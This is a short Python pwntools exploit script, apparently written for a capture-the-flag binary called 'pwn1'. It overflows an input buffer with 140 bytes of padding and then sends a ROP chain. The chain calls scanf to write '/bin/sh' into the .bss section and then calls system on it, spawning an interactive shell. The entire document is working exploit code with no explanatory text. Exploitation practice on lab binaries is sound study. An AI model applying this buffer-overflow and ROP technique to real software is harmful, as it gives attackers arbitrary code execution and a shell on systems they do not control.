# coding:utf-8
# 使用pwntools中的ROP模块

from pwn import *

context.log_level='debug'

io = process('./pwn1')
e = ELF('./pwn1')
r = ROP(e)

gdb.attach(io, 'b *0x08048789')

io.recvuntil('name:')

_s = 0x0804888F
r.call(e.plt['__isoc99_scanf'], [_s, e.bss()])
r.system(e.bss())

print "[*] ROP chain:\n",  r.dump()

io.sendline('A'*140 + r.chain())

io.recvuntil(':')
io.sendline('1')

io.recv()
io.sendline('/bin/sh')
io.interactive()

